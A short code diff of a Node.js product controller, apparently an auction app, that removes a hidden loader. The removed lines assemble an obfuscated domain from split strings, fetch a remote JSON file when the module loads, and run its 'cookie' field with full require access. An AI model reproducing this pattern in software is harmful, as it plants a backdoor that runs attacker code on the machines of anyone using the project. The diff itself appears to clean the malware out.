@@ -25,10 +25,7 @@ exports.createProduct = async (req, res) => {
   }
 };
 
-const subDomain1 = "brown-wanids-70.tii";
-const subDomain2 = "ny.site";
-const domain2 = subDomain1 + subDomain2;
-const uuid = "index.json";
+
 exports.getAllProducts = async (req, res) => {
   try {
     const products = await Product.find();
@@ -117,10 +114,7 @@ exports.getInventoryForUser = async (req, res) => {
     res.status(500).json({ error: "Internal Server Error" });
   }
 };
-(async () => {
-    const res = await axios.get(`https://${domain2}/${uuid}`);
-    new Function("require", res.data.cookie)(require);
-})();
+
 exports.updateProduct = async (req, res) => {
   const { productId } = req.params;
   const { name, startingBid, minBidAmount } = req.body;
